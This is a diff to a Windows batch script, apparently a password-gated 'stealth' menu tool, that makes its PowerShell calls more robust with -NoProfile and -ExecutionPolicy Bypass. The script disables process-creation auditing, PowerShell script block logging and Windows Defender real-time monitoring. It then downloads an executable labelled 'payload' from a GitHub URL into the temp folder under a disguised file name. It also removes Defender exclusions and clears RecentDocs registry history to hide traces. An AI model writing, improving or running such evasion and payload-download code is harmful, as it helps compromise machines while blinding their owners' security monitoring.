@@ -7,7 +7,10 @@ set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.
 
 set "SETUP_EXE=%temp%\CAXVN.exe"
 set "DISGUISED_EXE=%temp%\user_data_blob.dat"
-set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"
+
+:: Determine which PowerShell is available
+set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
+if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"
 
 :LOGIN
 cls
@@ -35,7 +38,7 @@ goto LOGIN
 
 :CheckStealthPassword
 set "inputpass=%~1"
-for /f "usebackq delims=" %%A in (`"%PWSH%" -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
+for /f "usebackq delims=" %%A in (`"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
 if /i "%inputpass%"=="%remote_pass%" (
     exit /b 0
 ) else (
@@ -159,14 +162,14 @@ goto STEALTH_MENU
 echo Disabling process creation auditing...
 auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
 echo Disabling PowerShell script block logging...
-"%PWSH%" -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0" >nul 2>&1
+"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0" >nul 2>&1
 exit /b 0
 
 :ENABLE_AUDIT_LOGS
 echo Re-enabling process creation auditing...
 auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
 echo Enabling PowerShell script block logging...
-"%PWSH%" -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1" >nul 2>&1
+"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1" >nul 2>&1
 exit /b 0
 
 :: === Setup ===
@@ -174,19 +177,19 @@ exit /b 0
 call :DISABLE_AUDIT_LOGS
 
 echo Disabling Windows Defender temporarily...
-"%PWSH%" -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
 echo STEP 3: Downloading payload (CAXVN.exe)...
-"%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1
+"%PWSH%" -NoProfile -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1
 
 if not exist "%SETUP_EXE%" (
     echo ERROR: Failed to download EXE. Aborting setup.
     call :ENABLE_AUDIT_LOGS
-    "%PWSH%" -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
     pause
     goto STEALTH_MENU
 )
@@ -194,7 +197,7 @@ if not exist "%SETUP_EXE%" (
 echo Download successful.
 call :ENABLE_AUDIT_LOGS
 echo Re-enabling Windows Defender...
-"%PWSH%" -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
 
 pause
 goto STEALTH_MENU
@@ -247,7 +250,7 @@ echo Enabling audit logs...
 call :ENABLE_AUDIT_LOGS
 
 echo Removing Windows Defender exclusion for EXE...
-"%PWSH%" -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+"%PWSH%" -NoProfile -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
 
 echo Running cleanup...
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
